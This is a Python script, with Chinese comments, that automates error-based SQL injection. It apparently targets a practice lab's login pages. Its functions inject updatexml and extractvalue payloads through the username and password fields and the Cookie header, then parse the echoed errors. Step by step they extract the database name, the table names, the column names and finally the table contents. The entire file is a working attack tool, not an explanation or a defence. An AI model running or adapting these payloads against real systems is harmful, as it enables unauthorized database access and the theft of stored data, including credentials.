import requests
from bs4 import BeautifulSoup
# POST请求
def db(url,urlpayload,Flag=0):
    # 发送post请求，参数一是url，参数二是请求体
    if(Flag==1):
        payload = {"uname": "admin" ,"passwd": "1"+urlpayload+"and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#"};
        response = requests.post(url, payload)
    elif(Flag==0):
        payload = {"uname": urlpayload + "and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#",
                   "passwd": "123456"};
        response = requests.post(url,payload)
    elif(Flag==2):
        payload={"Cookie":"uname="+urlpayload+" and extractvalue(1,concat(0x7e,database(),0x7e)) #"}
        response = requests.post(url,headers=payload)
    # print("pyl:"+payload["passwd"])
    # 解析htm
    # print("text="+response.text)
    soup = BeautifulSoup(response.text, 'html.parser')
    # 返回html中回显的相关注入的内容
    if(Flag==1):
        s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    elif (Flag == 0):
        s=soup.find('font', {'size': '3', 'color': '#0000ff'}).text.strip()
    elif(Flag==2):
        s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    return s;

def table(url,urlpayload,Flag=0):
    if(Flag==1):
        payload = {"uname":"admin","passwd":"1"+urlpayload+"and updatexml(2,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1)#"};
        response = requests.post(url,payload)
    elif (Flag == 0):
        payload = {"uname":urlpayload+"and updatexml(2,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1)#","passwd":"123456"};
        response = requests.post(url,payload)
    elif(Flag==2):
        payload={"Cookie":"uname="+urlpayload+"and updatexml(2,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1)#"}
        response = requests.post(url,headers=payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    if(Flag==1):
        s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    elif (Flag == 0):
        s=soup.find('font', {'size': '3', 'color': '#0000ff'}).text.strip()
    elif(Flag==2):
        s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)

def colum(url,urlpayload,table_name,Flag=0):
    if(Flag==1):
        payload = {
            "uname": "admin" ,"passwd": "1"+urlpayload+"and updatexml(2,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{0}' ),0x7e),1)#".format(
                table_name)};
        response = requests.post(url, payload)
    elif (Flag == 0):
        payload = {"uname":urlpayload+"and updatexml(2,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{0}' ),0x7e),1)#".format(table_name),"passwd":"123456"};
        response = requests.post(url, payload)
    elif(Flag==2):
        payload={"Cookie":"uname="+urlpayload+"and updatexml(2,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{0}' ),0x7e),1)#".format(table_name)}
        response = requests.post(url,headers=payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    if(Flag==1):
        s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    elif (Flag == 0):
        s=soup.find('font', {'size': '3', 'color': '#0000ff'}).text.strip()
    elif(Flag==2):
        s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)

def xx(url,urlpayload,database,table_name,column,Flag=0):
    if(Flag==1):
        payload = {"uname":"admin","passwd":"1"+urlpayload+"and updatexml(1,concat(0x7e,(select e from (select group_concat({0}) as e from {1}.{2}) as a),0x7e),1)# ".format(column,database,table_name)};
        response = requests.post(url, payload)
    elif (Flag == 0):
        payload = {"uname":urlpayload+"and updatexml(2,concat(0x7e,(select group_concat({0}) from {1}.{2}  ),0x7e),1) #".format(column,database,table_name),"passwd":"123456"};
        response = requests.post(url, payload)
    elif(Flag==2):
        payload={"Cookie":"uname="+urlpayload+"and updatexml(2,concat(0x7e,(select group_concat({0}) from {1}.{2}  ),0x7e),1) #".format(column,database,table_name)}
        response = requests.post(url,headers=payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    if(Flag==1):
        s=soup.find('font', {'size': '3', 'color': '#FFFF00'}).text.strip()
    elif (Flag == 0):
        s=soup.find('font', {'size': '3', 'color': '#0000ff'}).text.strip()
    elif(Flag==2):
        s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)